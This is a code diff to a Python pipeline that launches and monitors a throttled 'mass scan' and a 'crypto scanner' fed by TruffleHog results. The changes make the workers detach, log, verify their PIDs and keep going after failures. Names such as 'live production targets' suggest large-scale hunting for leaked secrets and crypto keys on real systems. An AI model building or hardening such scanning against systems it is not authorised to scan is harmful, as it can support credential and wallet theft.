@@ -161,11 +161,35 @@ def _ensure_mass_scan_running() -> bool:
         throttler_pid_file.unlink(missing_ok=True)
 
     _log(f"[*] Starting {throttler_script.name}...")
+    log_path = HOME / ("adaptive_scan.log" if "adaptive" in throttler_script.name else "run_throttled_out.log")
     cmd = [sys.executable, str(throttler_script)]
-    subprocess.Popen(cmd, cwd=str(HOME))
+    with open(log_path, "a", encoding="utf-8") as logf:
+        proc = subprocess.Popen(
+            cmd,
+            cwd=str(HOME),
+            stdout=logf,
+            stderr=subprocess.STDOUT,
+            start_new_session=True,
+        )
     # Give it a moment to start and write PID
-    time.sleep(2)
-    return throttler_pid_file.exists()
+    time.sleep(3)
+    # Prefer the PID file the child writes; fall back to Popen pid
+    live_pid = None
+    if throttler_pid_file.exists():
+        try:
+            live_pid = int(throttler_pid_file.read_text().strip())
+        except ValueError:
+            live_pid = None
+    if live_pid is None:
+        live_pid = proc.pid
+        throttler_pid_file.write_text(str(live_pid) + chr(10))
+    try:
+        os.kill(live_pid, 0)
+        _log(f"[+] {throttler_script.name} running (PID {live_pid})")
+        return True
+    except OSError:
+        _log(f"[!] {throttler_script.name} exited immediately (PID {live_pid})")
+        return False
 
 def _ensure_crypto_scanner_running() -> bool:
     """Ensure crypto scanner is running."""
@@ -192,11 +216,38 @@ def _ensure_crypto_scanner_running() -> bool:
         CRYPTO_PID_FILE.unlink(missing_ok=True)
 
     _log(f"[*] Starting {CRYPTO_SCANNER.name}...")
-    cmd = [sys.executable, str(CRYPTO_SCANNER), "-l", str(TRUFFLEHOG_MASS_RESULTS)]
-    subprocess.Popen(cmd, cwd=str(HOME), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    # Give it a moment to start and write PID
-    time.sleep(2)
-    return CRYPTO_PID_FILE.exists()
+    # Prefer mass results stream; fall back to standard results file.
+    scan_file = TRUFFLEHOG_MASS_RESULTS if TRUFFLEHOG_MASS_RESULTS.exists() else TRUFFLEHOG_RESULTS
+    try:
+        scan_file.touch(exist_ok=True)
+    except OSError:
+        pass
+    cmd = [sys.executable, str(CRYPTO_SCANNER), str(scan_file)]
+    with open(CRYPTO_SCANNER_LOG, "a", encoding="utf-8") as logf:
+        proc = subprocess.Popen(
+            cmd,
+            cwd=str(HOME),
+            stdout=logf,
+            stderr=subprocess.STDOUT,
+            start_new_session=True,
+        )
+    time.sleep(3)
+    live_pid = None
+    if CRYPTO_PID_FILE.exists():
+        try:
+            live_pid = int(CRYPTO_PID_FILE.read_text().strip())
+        except ValueError:
+            live_pid = None
+    if live_pid is None:
+        live_pid = proc.pid
+        CRYPTO_PID_FILE.write_text(str(live_pid) + chr(10))
+    try:
+        os.kill(live_pid, 0)
+        _log(f"[+] {CRYPTO_SCANNER.name} running (PID {live_pid}) file={scan_file.name}")
+        return True
+    except OSError:
+        _log(f"[!] {CRYPTO_SCANNER.name} exited immediately (PID {live_pid})")
+        return False
 
 def generate_targets() -> int:
     """Live production targets + outcome-based reorder. No placeholders."""
@@ -252,14 +303,12 @@ def run_pipeline() -> int:
     # Step 2: Process paste box with enhanced deobfuscation
     _step(2, "Processing paste box with enhanced deobfuscation")
     if process_paste_box() != 0:
-        _log("[!] Paste box processing failed")
-        return 1
+        _log("[!] Paste box processing failed — continuing with existing paste.txt")
 
     # Step 3: Ensure mass scan is running with adaptive throttling
     _step(3, "Ensuring adaptive mass scan is running")
     if not _ensure_mass_scan_running():
-        _log("[!] Failed to start adaptive mass scan")
-        return 1
+        _log("[!] Failed to start adaptive mass scan — will rely on watchdog/keepalive")
 
     # Step 4: Ensure crypto scanner is running with verification
     _step(4, "Ensuring crypto scanner is running with verification")
